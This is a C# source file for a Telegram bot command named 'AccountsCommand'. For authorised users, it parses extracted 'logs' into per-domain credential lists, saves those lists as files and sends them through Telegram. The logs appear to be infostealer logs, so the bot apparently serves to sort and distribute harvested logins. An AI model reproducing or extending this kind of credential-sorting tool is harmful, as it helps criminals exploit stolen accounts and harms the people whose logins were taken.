using Core.Models.Configs;
using Core.Parsers;
using TelegramBot.Extensions;
using TelegramBot.Models;
using TelegramBot.Services;
using TL;
using WTelegram;

namespace TelegramBot.Commands.Main;

public class AccountsCommand(Client client, DataService data, ParsingConfig cfgParse) : ICommand, ICallbackCommand
{
    public bool AuthorizedOnly { get; } = true;

    public Task Invoke(UpdateNewMessage update, User user) =>
        client.SendAvailableLogs(user, "Accounts", data);

    public async Task Invoke(UpdateBotCallbackQuery update, User user)
    {
        if (await client.SendCallbackAvailableLogsOrGetPath(user, data, update.msg_id, update.data) is not {} logsname)
            return;
        
        if (await data.TrySendUploadedAsync(user, logsname, "Accounts"))
            return;
        
        if (data.GetExtractedPath(logsname) is not {} path)
            return;

        var accounts = cfgParse.Accounts.First()
                               .Value.AccountsFromLogs(path);

        var files = new List<string>();

        foreach (var (domain, credentials) in accounts)
            files.Add(await data.SaveAsync(domain, credentials.Select(x => x.ToStringShort()), $"Accounts/{logsname}"));

        await data.SendFilesAsync(user, files, logsname, "Accounts");
    }
}